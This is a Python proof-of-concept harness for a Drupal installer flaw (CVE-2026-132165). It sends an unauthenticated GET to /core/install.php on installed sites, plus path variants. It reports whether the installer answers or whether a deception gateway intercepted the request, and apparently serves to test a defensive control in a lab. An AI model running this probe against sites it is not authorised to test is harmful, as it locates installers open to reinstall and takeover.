#!/usr/bin/env python3
"""PoC harness for CVE-2026-132165 (Fail2Install, SA-CORE-2026-017).

What this CVE's exploit *is*, per the advisory and the public write-up
(https://www.drupal.org/sa-core-2026-017,
https://www.stepsecurity.io/blog/fail2install-cve-2026-132165):

    An unauthenticated GET of the core installer - `core/install.php`, the fixed
    URI this CVE exists around - against a site that is already installed. On an
    affected version the installer answers even though the site is installed; the
    attacker's continuation (submit the Reinstall form with an attacker database)
    is what the "reinstall and RCE" wording describes, and the write-up's own
    measured reproduction stops at receiving the installer's form under a
    database-connection race.

    The write-up's own check set (its "What to Do Now" step 1) is three requests:
        curl -I  /core/install.php
        curl -IL /install.php          (follows a 301 to /core/install.php on 8+)
        curl -I  /core/install.php/foo (the PATH_INFO spelling; a location that
                                        ends `.php` still runs via PATH_INFO)
    and the vendor-recommended Apache mitigation is a <Location> deny for the
    same fixed URI. The StepSecurity reproduction's attacker request is
        GET /core/install.php?langcode=en&profile=standard
    - which is the request this harness sends as the exploit request.

Modes (the same two the PHP CVE PoC ports use, for the same reason):

    check    - read the target's own reported behaviour and refuse a target that
               is not the expected installed Drupal (the references' way of not
               crediting a wrong victim); also reads X-Generator / X-Powered-By
               so the victim's version is the target's own words, not ours.
    exploit  - send the attacker request, classify the answer:
               `app-answer`      -> the Drupal installer page was served: the
                                   vulnerable behaviour occurred (EXPLOITED)
               `gateway-inline`  -> the fleet-filter gateway answered its
                                   deception profile; the app never saw it
                                   (CONTROLLED, the with-control arm's answer)
               `gateway-upstream-error (502)` -> the app died mid-request
               anything else     -> refuse (rc 2), never a silent pass.

No --restart-cmd: unlike the PHP engine CVEs there is no fresh-worker condition
here; Drupal answers the same whether it is the first request or the hundredth,
so the references (which are curl-shaped requests, not a race program we must
re-implement) need no worker recycle and we do not fake one.
"""

import argparse
import re
import sys
import urllib.error
import urllib.request

EXPLOIT_PATH = "/core/install.php?langcode=en&profile=standard"  # the write-up's own request
VULN_TITLE = "Drupal already installed | Drupal"  # installed-site installer page, pre-fix and post-fix alike


def fetch(base, path, timeout=30):
    """One GET via urllib against an explicit base; returns (status, headers, body_head).

    urllib, not curl, because the harness output needs the parsed headers apart
    (the gateway's deception header must be read from a field, not grepped out of
    a mixed curl dump), and because every reference's own harness is one library
    call deep - there is no connection trickery in this CVE's request to reproduce.
    """
    req = urllib.request.Request(base.rstrip("/") + path, method="GET")
    req.add_header("User-Agent", "curl/8.18.0")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        return err.code, dict(err.headers), err.read(65536).decode("utf-8", "replace")


def title_of(body):
    match = re.search(r"<title>([^<]*)</title>", body, re.I)
    return match.group(1).strip() if match else None


def classify(status, headers, body):
    """The reference PoCs' answer taxonomy, same strings as lab/php-129496/poc.py.

    The deception-header check comes first and is what distinguishes the gateway's
    forged answer from the app's real one; a gateway proxying a live Drupal and a
    gateway answering from the detection produce different header sets, and the
    arm's verdict is about *which process answered*, which is exactly what the
    skill's counterfactual asks to observe.
    """
    deception = headers.get("X-Fleet-Filter-Deception") or headers.get("x-fleet-filter-deception")
    if deception:
        return "gateway-inline", "gateway-inline (%s %s)" % (status, deception)
    if status == 502:
        return "gateway-upstream-error", "gateway-upstream-error (%s)" % status
    if status in (200, 301, 302):
        title = title_of(body)
        generator = headers.get("X-Generator") or headers.get("x-generator") or ""
        detail = "%d" % status
        if title:
            detail += ", title %r" % title
        if generator:
            detail += ", X-Generator %r" % generator
        detail += ", Server %r" % (headers.get("Server") or headers.get("server") or "")
        return "app-answer", detail
    return "other", str(status)


def check(args):
    """Read the victim's own answers for the whole official check set."""
    ok = True
    for path, expect in (
        ("/", "site front page"),
        (EXPLOIT_PATH, "the attacker request"),
        ("/core/install.php", "installer, exact spelling"),
        ("/install.php", "legacy root spelling (D8+ answers 301 to core/install.php)"),
        ("/core/install.php/foo", "PATH_INFO spelling"),
    ):
        status, headers, body = fetch(args.target, path)
        kind, detail = classify(status, headers, body)
        print("check: %-46s -> %s" % (path, detail if kind == "app-answer" else "%s %s" % (kind, detail)))
        if path == "/" and args.expect_site and args.expect_site not in (title_of(body) or ""):
            print("check: REFUSED - front page title %r does not name %r"
                  % (title_of(body), args.expect_site))
            ok = False
        if path == EXPLOIT_PATH and args.expect_title and title_of(body) != args.expect_title:
            print("check: REFUSED - installer title is %r, expected %r"
                  % (title_of(body), args.expect_title))
            ok = False
    gen_status, gen_headers, _ = fetch(args.target, "/")
    for header in ("X-Generator", "Server", "X-Powered-By"):
        value = gen_headers.get(header) or gen_headers.get(header.lower())
        if value:
            print("check: victim's own %s: %s" % (header, value))
    print("check: %s" % ("OK" if ok else "REFUSED"))
    return 0 if ok else 2


def exploit(args):
    """Send the attacker request and verdict it (the reference harnesses' core)."""
    status, headers, body = fetch(args.target, EXPLOIT_PATH)
    kind, detail = classify(status, headers, body)
    print("exploit: target=%s" % args.target)
    print("exploit: GET %s" % EXPLOIT_PATH)
    print("exploit: answer: %s" % (detail if kind == "app-answer" else "%s (%s)" % (kind, detail)))
    if kind == "app-answer":
        title = title_of(body) or ""
        if args.expect_title and title != args.expect_title:
            print("exploit: NOT THE EXPECTED INSTALLER ANSWER (title %r)" % title)
            return 2
        print("exploit: EXPLOITED (the installer answered an anonymous request on an installed"
              " site - the request this CVE exists to serve, served)")
        return 0
    if kind == "gateway-inline":
        print("exploit: CONTROLLED (answered by the gateway, the app never saw it)")
        return 1
    print("exploit: NOT EXPLOITED (unexpected answer: %s)" % detail)
    return 1


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("mode", choices=("check", "exploit"))
    ap.add_argument("--target", required=True, help="http://host:port of the victim or of a gateway in front of it")
    ap.add_argument("--expect-site", default="", help="check: the site name the front page title must contain")
    ap.add_argument("--expect-title", default=VULN_TITLE,
                    help="exploit: the exact installer <title> the victim must return (default: the"
                         " installed-site page the vendor's mitigation exists to deny)")
    args = ap.parse_args()
    return check(args) if args.mode == "check" else exploit(args)


if __name__ == "__main__":
    sys.exit(main())
